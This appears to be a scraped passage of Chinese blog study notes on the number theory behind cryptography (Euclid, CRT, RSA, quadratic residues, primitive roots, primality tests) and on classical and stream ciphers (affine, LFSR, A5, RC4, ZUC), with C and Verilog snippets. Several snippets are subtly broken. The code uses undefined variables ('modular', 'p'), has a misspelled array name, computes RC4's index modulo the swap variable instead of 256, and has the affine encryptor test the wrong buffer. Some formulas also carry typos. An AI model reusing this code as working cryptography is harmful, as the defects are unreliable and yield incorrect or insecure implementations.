\u0026amp;=b_{i-1}x_i+(a_{i-1}\\%b_{i-1})y_i\\\\ \u0026amp;=b_{i-1}x_i+[a_{i-1}-(a_{i-1}/b_{i-1})b_{i-1}]y_i\\\\ \u0026amp;=y_ia_{i-1}+[x_i-(a_{i-1}/b_{i-1})y_i]b_{i-1}\\\\ \u0026amp;=x_{i-1}a_{i-1}+y_{i-1}b_{i-1} \\end{align}$$\n1 2 3 4 5 6 7 8 9 10 11 12 13 int extEuclid(int a, int b, int* x, int* y){ if (b==0){ *x = 1; *y = 0; return a; } else { int tempX,tempY; int gcd = extEuclid(b,a%b,\u0026amp;tempX,\u0026amp;tempY); *y = tempX-(a/b)*tempY; *x = tempY; return gcd; } } 而使用CPP元组写法上更优雅些:\n1 2 3 4 5 6 7 8 9 tuple\u0026lt;int,int,int\u0026gt;extEuclidCpp(int a, int b){ if (b==0){ return make_tuple(a,1,0); } else { int x,y,gcd; tie(x,y,gcd) = extEuclidCpp(b,a%b); return make_tuple(gcd,y,x-(a/b)*y); } } 定理: 素数i $p$ 及 $a,b\\in\\mathbb{Z}$, 若 $p|ab$ 则 $p|a$ 或 $p|b$.\n设 $p\\nmid a$ 且 $p\\nmid b$, 则 $\\exists x,y$ s.t. $xp+ya=1$, 故 $x(ab)+(by)p=b$, 有 $p|b$, 矛盾.\n唯一分解: $\\forall n\\in\\mathbb{Z}$, $n=\\prod p_i^{k_i}$, $p_i$ 为不同素数, $k_i\\in\\mathbb{Z}_+$, 形式唯一.\n同余 性质: $\\forall m\\in\\mathbb{Z}_+$, $a\\equiv b({\\rm mod}\\ m) \\Longleftrightarrow m|a-b$.\n$a\\equiv b({\\rm mod}\\ m)$, $c\\equiv d({\\rm mod}\\ m) \\Longrightarrow a+c\\equiv b+d({\\rm mod}\\ m)$, $ac\\equiv bd({\\rm mod}\\ m)$, $a^n\\equiv b^n({\\rm mod}\\ m)$. $ak\\equiv bk({\\rm mod}\\ m) \\Longrightarrow a\\equiv b({\\rm mod}\\ \\frac{m}{{\\rm gcd}(m,k)})$. 模 $m$ 剩余类: $\\mathbb{Z}/m\\mathbb{Z}$. 最小非负完全剩余系: $\\mathbb{Z}_m={0,1\u0026hellip;,m-1}$, 显然 $\\forall x\\neq y\\in\\mathbb{Z}_m$ s.t. $x\\not\\equiv y({\\rm mod}\\ m)$. 既约剩余系: $\\mathbb{Z}_m^*={a\\in\\mathbb{Z}_m|{\\rm gcd}(a,m)=1}$.\nEuler $\\varphi$ 函数: $$m=\\prod_{i=1}^r p_i^{k_i}, |\\mathbb{Z}_m^*|=\\varphi(m)=\\prod_{i=1}^r p_i^{k_i-1}(p_i-1)=m\\prod_{p|m}(1-\\frac{1}{p})$$\n当 $m=p$ 为素数时, 有 $\\varphi(p)=p-1$; $\\mathbb{Z}_p^*={1,2,\u0026hellip;,p-1}$ 为循环群, 生成元个数为$\\varphi(p-1)$.\n考察函数性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // O(n), 每个数均只遍历一次 void phiEulerLinerSieve(int n){ int phi[n+1], prime[n+1]; bool isSieved[n+1]; int count = 1; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[count++] = i; phi[i] = i-1; } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ int composite = i*prime[j]; isSieved[composite] = 1; if (i%prime[j] == 0){ phi[composite] = primep[j]*phi[i]; break; } else { phi[composite] = (prime[j]-1)*phi[i]; } } } } 定理: 若 ${\\rm \\gcd}(a,m)=1$, $x$ 遍历 $\\mathbb{Z}_m^*$, 则 $ax$ 也遍历$\\mathbb{Z}_m^*$.\n考虑 ${\\rm gcd}(ax,m)=1$ 及 $ax_i\\not\\equiv ax_j({\\rm mod}\\ m)$, $i\\neq j$.\n逆元: 若 ${\\rm gcd}(a,m)=1$, 则 $\\exists ! x\\in\\mathbb{Z}_m^*$ s.t. $ax\\equiv 1({\\rm mod}\\ m)$. Euler: 若 ${\\rm gcd}(a,m)=1$, 则 $a^{\\varphi(m)}\\equiv 1({\\rm mod}\\ m)$.\n$\\mathbb{Z}_m^*={x_1,\u0026hellip;,x_{\\varphi(m)}}={ax_1,\u0026hellip;,a_{\\varphi(m)}}$, 故 $\\prod x_i\\equiv\\prod ax_i({\\rm mod}\\ m)$, 已知 ${\\rm gcd}(x_i,m)=1$, 得 $m|a^{\\varphi(m)}-1$.\n特别 $m=p$ 为素数时, Fermat: 若 $p\\nmid a$, 则 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 有 $a^{-1}\\equiv a^{p-2}({\\rm mod}\\ p)$. 由扩展Euclid, ${\\rm gcd}(a,m)=1$, $\\exists s,t\\in\\mathbb{Z}$ s.t. $as+tm=1$, 即 $a^{-1}\\equiv s({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 int inverseExtEuclid(int a, int m){ int s,t; int gcd = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (gcd == 1){ return s; } else { return 0; } } wilson: 素数 $p$ 有 $(p-1)!\\equiv -1({\\rm mod}\\ p)$.\n$\\mathbb{Z}_m^*$ 中元素均存在逆, 自逆仅 $1,p-1$; ${2,3,\u0026hellip;,p-2}$ 中两两配对互逆.\n1 2 3 4 5 6 7 bool wilson(int p){ int factMod = 1; for (int i = p-1; i \u0026gt;= 1; --i){ factMod = (factMod*i)%p; } return (factMod+1)%p == 0; } 仿射: ${\\rm gcd}(a,26)=1$, 密钥对数量 $26\\varphi(26)-1=311$.\n加密 $c=E_{a,b}(m)=am+b({\\rm mod}\\ 26)$. 解密 $m=D_{a,b}(c)=a^{-1}(c-b)({\\rm mod}\\ 26)$. 同余式 同余式 $f(x)\\equiv a_nx^n+\u0026hellip;+a_1x+a_0({\\rm mod}\\ m)$, $a_i\\in\\mathbb{z}$, $m\\in\\mathbb{Z}_+$. 同余方程 $f(x)\\equiv 0({\\rm mod}\\ m)$ 至多有 $m$ 个解(剩余类).\n一次同余 $ax\\equiv b({\\rm mod}\\ m)$, $a,b\\in\\mathbb{Z}$, $m\\in\\mathbb{Z}_+$ 有解 $\\iff {\\rm gcd}(a,m)|b$.\n$ax\\equiv b({\\rm mod}\\ m)$ 在 ${\\rm gcd}(a,m)=1$ 时有唯一解 $x\\equiv a^{-1}b({\\rm mod}\\ m)$. 记 $d={\\rm gcd}(a,m)$, 有 $\\frac{a}{d}x\\equiv \\frac{b}{d}({\\rm mod}\\ \\frac{m}{d})$, 即 $x=\\frac{b}{d}(\\frac{a}{d})^{-1}+k\\frac{m}{d}$, $k\\in\\mathbb{Z}$. 考虑 $k=qd+r$, $q,r\\in\\mathbb{Z}$, $0\\leq r\u0026lt; d$, $x=[\\frac{b}{d}(\\frac{a}{d})^{-1}({\\rm mod}\\frac{m}{d})+r\\frac{m}{d}]({\\rm mod\\ m})$.\n求解步骤:\n扩展Euclid求 $d={\\rm gcd}(a,m)$, 记 $sa+tm=d$; $b\\%d=0$ 判断有无解; 设 $b\u0026rsquo;=b/d$, $m\u0026rsquo;=m/d$, $s\u0026rsquo;\\equiv s({\\rm mod}\\ m\u0026rsquo;)$; 得 $x\\equiv s\u0026rsquo;b\u0026rsquo;+rm\u0026rsquo;\\ ({\\rm mod}\\ m)$, $r=0,1,\u0026hellip;,d-1$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int linearCongEq (int a, int b, int m, int ansX[]){ a %= m; b %= m; int s,t; int origM = m; int d = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (b%d == 0){ b /= d; m /= d; s %= m; for (int r = 0; r \u0026lt;= d-1; ++r){ ansX[r] = ((s*b+r*m)%(origM)+origM)%origM; } return d; } else { return 0; } } 一次同余组(CRT): $m_{i{1\\leq i \\leq k}}$ 两两互素, 同余组 $x\\equiv a_i({\\rm mod\\ m_i})_{{1\\leq i\\leq k}}$ 有唯一解 $x=\\sum M_i M_i^{-1} a_i \\ ({\\rm mod}\\ m)$. 其中, $m=\\prod m_i$, $M_i=m/m_i$, $M_i^{-1}$ 为模 $m_i$ 上的逆.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 long crt (int a[],int m[],int n){ int modSepM[n]; int modIevM[n]; long modM[n]; long prodM = 1; long x = 0; for (int i = 0; i \u0026lt; n; ++i){ prodM *= m[i]*1L; } for (int i = 0; i \u0026lt; n; ++i){ modM[i] = 1L*prodM/m[i]; modSepM[i] = (1L*modM[i])%m[i]; modIevM[i] = inverseExtEuclid(modSepM[i],m[i]); if (!modIevM[i]){ return 0; } } for (int i = 0; i \u0026lt; n; ++i) { x = (x+1L*modIevM[i]*modM[i]*a[i])%prodM; } x = (x+prodM)%prodM; return x; } RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$.\n公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv c^d({\\rm mod}\\ n)$. 快速模幂 $r\\equiv t^e({\\rm mod}\\ n)$ 1 2 3 4 5 6 7 8 9 10 11 int fastPowerMod (int t, int ex, int n){ int r = 1; while (ex){ if (ex\u0026amp;1){ r = (1LL*r*t)%modular; } t = (1LL*t*t)%modular; ex \u0026gt;\u0026gt;= 1; } return r; } 二次剩余 $ax^2+bx+c\\equiv 0({\\rm mod}\\ m)$ 总能简化为 $x^2\\equiv d({\\rm mod}\\ q^k)$, $q$ 为素数, $a,b,c,d,m,k\\in\\mathbb{Z}_+$. 仅考虑 $x^2\\equiv a({\\rm mod}\\ q)$, ${\\rm gcd}(a,p)=1$, $a\\in\\mathbb{Z}$ 为模素数 $q$ 的二次剩余.\nEuler: ${\\rm gcd}(a,p)=1$, $p$ 为奇素数, $a\\in\\mathbb{Z}$:\n模 $p$ 的二次剩余恰有 $\\frac{p-1}{2}$ 个. $a$ 为模 $p$ 二次剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$, 此时 $x^2\\equiv a({\\rm mod}\\ p)$ 有二解. $a$ 为模 $p$ 二次非剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv -1({\\rm mod}\\ p)$. 显然 $i^2\\equiv(p-i)^2({\\rm mod}\\ p)$; 若 $j^2\\equiv i^2({\\rm mod}\\ p)$, $1\\leq i\u0026lt;j\u0026lt;\\frac{p}{2}$, 则 $p|j-i$ 或 $p|j+i$, 但 $j+i\u0026lt;p$, 矛盾.\n$a$ 为模 $p$ 二次剩余时, $\\exists x_0\\in\\mathbb{Z}$, ${\\rm gcd}(x_0,p)=1$, $x_0^2\\equiv a({\\rm mod}\\ p)$, 故 $a^{\\frac{p-1}{2}}\\equiv x_0^{p-1}\\equiv 1({\\rm mod}\\ p)$.\n$a$ 为模 $p$ 二次非剩余时, 考虑 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 则 $p|{\\frac{p-1}{2}}-1$ 或 $p|{\\frac{p-1}{2}}+1$, 但 $x^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$ 的全部解恰为全部的二次剩余.\nLegendre: $(\\frac{a}{p})=a^{\\frac{p-1}{2}}\\%p=1\\ {\\rm or}\\ -1\\ {\\rm or}\\ 0$, $p$ 为素数, $a\\in\\mathbb{Z}$.\n$$ (\\frac{1}{p}) = 1;\\ (\\frac{ab}{p})=(\\frac{a}{p})(\\frac{b}{p}); \\ (\\frac{a+b}{p})=(\\frac{a}{p})+(\\frac{b}{p})$$\n$$(\\frac{a^2}{p})=1,\\ {\\rm gcd}(a,p)=1$$\n$$ (\\frac{-1}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%4=1\\\\ \u0026amp;-1,\\ \u0026amp;p\\%4=3 \\end{cases}$$\n$$ (\\frac{2}{p})=\\begin{cases} \u0026amp;1,\\ \u0026amp;p\\%8=1,7\\\\ \u0026amp;-1,\\ \u0026amp;p\\%8=3,5 \\end{cases}$$\n二次互反: $(\\frac{p}{q})(\\frac{q}{p})=(-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}$, $p\\ne q$ 为奇素数.\nGuass: 奇素数 $p$, $a\\in\\mathbb{Z}$, ${\\rm gcd}(a,p)=1$, 设 $M_{a,p}={ka\\%p, \\ k=1,2,\u0026hellip;,\\frac{p-1}{2}\\ |\\ ka\\%p\u0026gt;\\frac{p}{2}}$, 记 $m(a,p)=|M_{a,p}|$, 则 $(\\frac{a}{p})=(-1)^{m(a,p)}$.\n设 $K={ka\\%p\\ |\\ k=1,2,\u0026hellip;,\\frac{p-1}{2}}$, $b_i\\in M$, $c_j\\in M-K$, $i=1,2,..,m(a,p)$, $j=1,2,\u0026hellip;,\\frac{p-1}{2}-m(a,p)$.\n显然有 $c_j\\ne p-b_i$, $\\forall i,j$; 否则 $p|b_i+c_j$, 即 $\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $p|a(x+y)$, 但 $x+y\u0026lt;p$, 矛盾.\n故 $a^{\\frac{p-1}{2}}(\\frac{p-1}{2})!\\equiv\\prod c_j \\prod (p-b_i)\\equiv (-1)^{m(a,p)}(\\frac{p-1}{2})!({\\rm mod}\\ p)$.\nEisenstein: $a$ 为奇数时, 记$e(a,p)=\\sum\\lfloor\\frac{ka}{p}\\rfloor$, 有 $e(a,p)\\equiv m(a,p)({\\rm mod}\\ 2)$.\n不妨设 $ka=d_kp+r_k$, $0\\leq r_k\\leq p-1$, $d_k,r_k\\in\\mathbb{Z}$, 有 $p\\sum d_k+\\sum r_k=\\sum ka = \\sum c_j+\\sum (p-b_i)$, 故 $\\sum d_k\\equiv m(a,p)({\\rm mod}\\ 2)$; 显然 $e(a,p)=\\sum d_k$.\n$q\\ne p$ 为奇素数时, $\\not\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $xp=qy$, 即 $e(p,q)+e(q,p)=\\frac{p-1}{2}\\frac{q-1}{2}$.\n$a=2$ 时, $\\lfloor\\frac{p}{4}\\rfloor\\leq k\\leq \\lfloor\\frac{p}{2}\\rfloor$, 有 $m=\\lfloor\\frac{p}{2}\\rfloor-\\lfloor\\frac{p}{4}\\rfloor$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int fastLegendre(int a, int p){ int s; int e = 0; if (a == 0 || a == 1){ return a; } else { while (a%2 == 0){ a /= 2; ++e; } if (e%2 == 0 || p%8 == 1 || p%8 == 7){ s = 1; } else { s = -1; } if (p%4 == 3 \u0026amp;\u0026amp; a%4 == 3){ s = -s; } if (a == 1){ return s; } else { return s*fastLegendre(p%a,a); } } } Rabin: 素数 $p\\equiv q\\equiv 3({\\rm mod}\\ 4)$.\n公钥 $n=pq$, 加密 $c\\equiv E_{n}(m)\\equiv m^2({\\rm mod}\\ n)$. 私钥 $(p,q)$, 解密 $m\\equiv D_{p,q}(c)\\equiv \\pm c^{\\frac{p+1}{4}}({\\rm mod}\\ p)\\equiv \\pm c^{\\frac{q+1}{4}}({\\rm mod}\\ q)\\ (2 in 4)$. 原根 原根: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 记 ${\\rm ord}_m(a)=\\inf{x\\in\\mathbb{Z}_+\\ | \\ a^x\\equiv 1({\\rm mod}\\ m)}$ 称为 $a$ 对模 $m$ 的阶; 特别, ${\\rm ord}_m(a)=\\varphi(m)$ 时称 $a$ 为模 $m$ 的原根.\n定理: $a,m\\in\\mathbb{Z}$, $m\u0026gt;1$, ${\\rm gcd}(a,m)=1$, 则 $a^n\\equiv 1({rm mod}\\ m)\\iff {\\rm ord}_m(a)|n$. 特别, ${\\rm ord}_m(a)|\\varphi(m)$.\n定理: $g$ 为模 $m$ 原根 $\\iff g^{\\frac{\\varphi(m)}{p_i}}\\not\\equiv 1({\\rm mod}\\ m)$, $\\forall$ 素数 $p_i|\\varphi(m)$.\n必要性: 显然.\n充分性: 若 $\\exists e\u0026lt;\\varphi(m)$ s.t. $g^e\\equiv 1({\\rm mod}\\ m)$; 不妨设 $\\frac{\\varphi(m)}{e}=kp$, $k\\in\\mathbb{Z}$, $p$ 为素数; 进而 $g^{\\frac{\\varphi(m)}{e}\\equiv(g^p)^k\\equiv 1({\\rm mod}\\ m)}$, 矛盾.\n定理: $a,m,d\\in\\mathbb{Z}_+$, ${\\rm gcd}(a,m)=1$, ${\\rm ord}_m(a^d)=\\frac{{\\rm ord}_m(a)}{{\\rm gcd}({\\rm ord}_m(a),d)}$. 推论: 模 $m$ 存在原根时, 有 $\\varphi(\\varphi(m))$ 个原根; 同时原根为模 $m$ 上本原多项式的全部解. 以下显然:\n${\\rm ord}_m(a)={\\rm ord}_m(a^{-1})$. $b\\equiv a({\\rm mod}\\ m)$, 则 ${\\rm ord}_m(b)={\\rm ord}_m(a)$. ${\\rm gcd}(a,m)=1$, $a^0,a^1,\u0026hellip;,a^{{\\rm ord}_m(a)-1}$ 两两模 $m$ 不同余. 特别, $g$ 为模 $m$ 原根时, 恰好有 $\\mathbb{Z}_p^*={g^0,g^1,\u0026hellip;,g^{\\varphi(g)-1}}$. $g$ 为模 $m$ 原根时, $x,y\\in\\mathbb{Z}$, $g^x\\equiv g^y({\\rm mod}\\ m) \\iff x\\equiv y({\\rm mod}\\ \\varphi(m))$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 bool nMod1(int a, int n, int p, int* primeFact){ int num = 0, r; while(primeFact[num]){ r = fastPowerMod(a,n/primeFact[num],p); if (r == 1){ break; } else { ++num; } if(!primeFact[num]) { return true; } } return false; } int minPrimeRoot(int p){ int n = p-1, res = 0; int primeFact[10] = {0}; factPrime(n,primeFact); for (int i = 2; i \u0026lt;= p/2; ++i) { if (nMod1(i,n,p,primeFact)){ res = i; break; } } return res; } D-H协议: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq x,y\\leq p-1$.\n公钥 $(p,g)$, 私钥 $x,y$. 握手: $k_{X\\to Y}\\equiv g^x({\\rm mod}\\ p)$, $k_{Y\\to X}\\equiv g^y({\\rm mod}\\ p)$. 密钥: $k\\equiv k_{Y\\to X}^x\\equiv k_{X\\to Y}^y \\equiv g^{xy}({\\rm mod}\\ p)$. ElGamal: 大素数 $p$ 和模 $p$ 原根 $g$, 任选 $2\\leq a\\leq p-1$, $Y_a\\equiv g^a({\\rm mod}\\ p)$.\n公钥 $(p,g,Y_a)$, 加密 $u\\equiv g^k({\\rm mod}\\ p)$, $v\\equiv mY_a^k({\\rm mod}\\ p)$, $c=E_{p,g,Y_a,k}(m)=(u,v)$, 任选 $2\\leq k\\leq p-1$. 私钥 $a$, 解密 $m\\equiv D_a(c)\\equiv \\frac{v}{u_a}({\\rm mod}\\ p)$. 素性检验 1 2 3 4 5 6 7 bool fermat(int n){ int a,r; srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,p-1,p); return r == 1; } 1 2 3 4 5 6 7 8 9 bool solovayStrassenX(int p){ int a, x, y; srand((unsigned int)time(0)); a = rand()%p+1; x = jacobi(a,p); // jacobi同fastLegendre x = (x+p)%p; y = fastPowerMod(a,(p-1)/2,p); return x != 0 \u0026amp;\u0026amp; x == y; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bool millerRabin(int p){ int k = 0, t = p-1, a, r; while(t%2 == 0){ t \u0026gt;\u0026gt;= 1; ++k; } srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,t,p); if (r == 1){ return true; } else{ for (int j = 0; j \u0026lt; k; ++j) { if (r == p-1){ return true; } else { r = (1LL*r*r)%p; } } } return false; } 群 环 域 ","date":"2023-09-05T00:00:00Z","permalink":"https://example.com/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"密码学数学基础"},{"content":"基础 基本属性: 信息机密性, 信息真实性, 数据完整性, 行为不可否认性.\n体制: $(M,C,K_1,K_2,E,D)$ 明文空间, 密文空间, 加密密钥空间, 解密密钥空间, 加密空间, 解密空间; 加密变换 $c=E_{k_1}(m)$, 解密变换 $m=D_{k_2}(c)$.\n类别: 对称加密, 非对称加密, Hash函数, 密码协议.\n分析: 唯密文攻击, 已知明文攻击, 选择明文攻击, 选择密文攻击, 自适应选择明文攻击, 选择密钥攻击.\n评价: 无条件安全 $P(M|C)=P(M)$; 可证明安全(破解本质为数学难题); 计算安全(破解代价超过信息价值;破解时间超过信息时效).\n攻击: 被动攻击(监听-信息机密性); 主动攻击(伪造-信息真实性,篡改-数据完整性,否认-行为不可否认性).\n古典密码 古典密码主要为置换密码和代换密码.\n置换密码: $\\sigma$ 为 $M$ 上一个置换(到自身的双射).\n加密: $(c_i)=E_{k}((m_i))=\\sigma_{k_i}((m_i))$. 解密: $(m_i)=D_{k}((c-i))=\\sigma_{k_i}^{-1}((c_i))$. 代换密码\n加密: $c_i=E_{k}(m_i)\\equiv f(m_i,k)({\\rm mod}\\ 26)$. 解密: $m_i=E_{k}(c_i)\\equiv f^{-1}(c_i,k^{-1})({\\rm mod}\\ 26)$. 单表代换可以直接通过字母频率分析破解.\n1 2 3 4 5 6 7 8 9 10 11 void freqAnalyze(char *ciphertext, long *count){ int num = 0; while (ciphertext[num] != \u0026#39;\\0\u0026#39;){ if (isupper(ciphertext[num])){ count[ciphertext[num]-\u0026#39;A\u0026#39;]++; } else if (islower(ciphertext[num])){ count[ciphertext[num]-\u0026#39;a\u0026#39;]++; } ++num; } } 粗糙度: ${\\rm M.R}=\\sum_{i=0}^25(p_i-\\frac{1}{26})^2=\\sum_{i=0}^25p_i^2-0.0385$. 明文或单表代换时 ${\\rm M.R}\\approx 0.027$, 更接近 $0$ 则更可能为多表代换.\n重合指数: ${\\rm IC}=\\sum_{i=0}^25p_i^2$. 多表代换时 ${\\rm IC}\\approx 0.0655$. 相同字母间隔为 $d_1,\u0026hellip;,d_n$, 则密钥可能长度为 ${\\rm gcd}(d_1,\u0026hellip;,d_n)$.\n仿射密码 单表代换的代表.\n1 2 3 4 5 6 7 8 9 10 11 12 void affineEncrypt(char *plaintext, char *ciphertext, int keyA, int keyB){ long length = strlen(plaintext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;A\u0026#39;)+keyB)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;a\u0026#39;)+keyB)%26+\u0026#39;a\u0026#39;; } else { ciphertext[i] = plaintext[i]; } } } 1 2 3 4 5 6 7 8 9 10 11 12 void affineDecrypt(char *ciphertext, char *plaintext, int keyAReverse, int keyB){ long length = strlen(ciphertext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;A\u0026#39;-keyB))%26+26)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;a\u0026#39;-keyB))%26+26)%26+\u0026#39;a\u0026#39;; } else { plaintext[i] = ciphertext[i]; } } } Vernam密码 序列密码的基础.\n自同步序列密码 异或$\\rm XOR$ ($GF(2)$加法) $\\oplus$ 加密: 无条件安全; 可逆.\n与同步序列密码相比, 传输产生的错误有界.\n种子密钥通过LFSR(线性反馈移位寄存器)生成伪随机密钥序列 $k=k_0k_1k_2\u0026hellip;$.\n加密 $c_i=E_{k}(m)=m_i\\oplus k_i$. 解密 $m_i=D_{k}(m)=c_i\\oplus k_i$. LFSR: 状态 $(s_0,s_1,\u0026hellip;,s_{n-1})$, 递推关系式 $s_{n+k}=\\bigoplus g_is_i$, 反馈函数 $f(s_0,s_1,\u0026hellip;,s_{n-1})=\\sum g_is_i$, 连接多项式(特征多项式) $g(x)=\\sum g_ix_i$, $s_i,g_i,x_i\\in GF(2)$.\ne.g. $\\ g(x)=1+x+x^2+x^5$, $s_{5+i}=s_{i}+s_{1+i}+s_{4+i}$. $S_0=(1,0,1,1,1)$, $k=101110111011101110111\u0026hellip;$, $T=8$.\n使用verligo实现LFSR.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 32-bit long module lfsr(32)(clk, reset, lfsr); input clk, reset; output reg [31:0] lfsr; wire d0; xnor(d0, lfsr[31], lfsr[21], lfsr[1], lfsr[0]); always @(posedge clk, posedge reset) begin if(reset) begin lfsr \u0026lt;= 32\u0026#39;h00000001; end else begin lfsr \u0026lt;= {lfsr[30:0], d0}; end end endmodule 定理: $n$ 次特征多项式为 $GF(2^n)$ 上本原多项式时, 输出 $\\max T=2^n-1$ 序列($m$ 序列).\n将 $x^{2^n-1}-1$ 在 $GF(2^n)$ 上因式分解; 保留次数为 $n$ 且不能在 $GF(2^n)$ 上整除 $x^a-1,n\u0026lt;a\u0026lt;2^n-1$ 的因式. 截获长度 $l\\geq 2(2^n-1)$ 的明密文对 $(c,m)$, 则 $k=c\\oplus m$, 有 $S_i,\u0026hellip;,S_{i+n+1}$ 个状态; 记 $X=(S_i,\u0026hellip;,S_n)$, $Y=(S_{i+1},\u0026hellip;,S_{i+n+1})$, 有 $Y\\equiv HX({\\rm mod}\\ 2)$. $m$ 序列时, $X$满秩, $H\\equiv YX^{-1}({\\rm mod}\\ 2)$ 为特征多项式的友矩阵.\n$$H=\\left( \\begin{array}{} 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ \u0026hellip; \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 1 \\\\ g_0 \u0026amp; g_1 \u0026amp; g_2 \u0026amp; \u0026hellip; \u0026amp; g_{n-1} \\end{array}\\right )$$\n可引入非线性运算增加复杂性: 与AND($GF(2)$上乘法) $\\otimes$.\nAD5 欧洲移动通信GSM标准, 手机到基站间的链路语音加密. 由19位, 22位, 23位3个LSR组成; 时钟控制信号来自LSR1第8位, LSR2第10位, LSR3第10位; 若三者相同则均移位, 若两者相同则相同的移位, 不同的不移位; 即每个时钟至少有两个LSR移位.\n不同文献的连接多项式不同, 其中一个为:\n$$\\begin{cases} g_1(x)=x^{19}+x^{18}+x^{17}+x^{14}+1 \\\\ g_2(x)=x^{22}+x^{21}+1 \\\\ g_3(x)=x^{23}+x^{22}+x^{21}+x^8+1 \\end{cases}$$\n安全问题: 三个LSR长度过短; 种子密钥不同也会产生相同的密钥序列; 以目前计算能力不安全.\nRC4 基于非线性数据表变换. 密钥流产生分为2个阶段: 输入密钥并初始化排列S表; S表不断置换产生密钥流.\n初始化: 线性填充256字节S表, 密钥循环填充T表. $i$ 遍历 $0-255$, $j=(j+S[i]+T[i])\\%256$, 交换 $S[i]$ 和 $S[j]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void init(uint8 *S){ char key[256] = \u0026#34;\u0026#34;, T[256] = \u0026#34;\u0026#34;; printf(\u0026#34;Key:\u0026#34;); fgets(key,256,stdin); int keyLen = strlen(key); uint8 tmp = 0, j = 0, k = 0; for (int i = 0; i \u0026lt; 256; ++i) { S[i] = i; T[i] = key[i%keyLen]; } for (int i = 0; i \u0026lt; 256; ++i) { j = (j+S[i]+T[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; } } 产生密钥流: $i$ 循环遍历 $0-255$, $j=(j+S[i])\\%256$, 交换 $S[i]$ 和 $S[j]$, $t=(S[i]+S[j])\\%256$, $k_i=S[t]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 void rc4EnDe(uint8 *S, char *text, char *result){ int i = 0, j = 0, t = 0; uint8 tmp; unsigned long len = strlen(text); for (unsigned long k = 0; k \u0026lt; len; ++k) { i = (i+1)%256; j = (j+S[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; t = (S[i]+S[j])%tmp; result[k] = text[k]^S[t]; } } 安全问题: 存在弱密钥使得初始化置换后 $S$ 表顺序不变; 存在弱密钥使得密钥流在100万字节内完全重复; 密钥较短的容易被攻击, 但长度超过128位的密钥依然有效.\nZUC LTE-4G国际标准, 包含机密性128-EEA3和完整性128-EIA3, 基于LFSR的非线性组合逻辑结构. 分为三层结构: LSFR, Bit重组, 非线性F函数. 符号约定: $\\boxplus$ 为$GF(2^{32})$ 上加法; $|$ 为连接字符串; $_H$ 为高位16位; $_L$ 为低位16位; $\u0026lt; \u0026lt;_o$ 为循环左移.\n1 2 3 4 5 6 7 8 9 10 11 12 13 uint32 modAdd(uint32 a, uint32 b){ uint32 c = a+b; c = (c\u0026amp;0x7fffffff)+(c\u0026gt;\u0026gt;31); return c; } uint32 mod2ExpMulti(uint32 x, int exp){ return ((x\u0026lt;\u0026lt;exp)|(x\u0026gt;\u0026gt;(31-exp)))\u0026amp;0xfffffff; } uint32 rot(uint32 x, int mov){ return (x\u0026lt;\u0026lt;mov)|(x\u0026gt;\u0026gt;(31-mov)); } 输入参数: COUNT 计数器 32bit; BEARER 传载层标识 5bit; DIRECTION 传输方向标志 1bit; CK 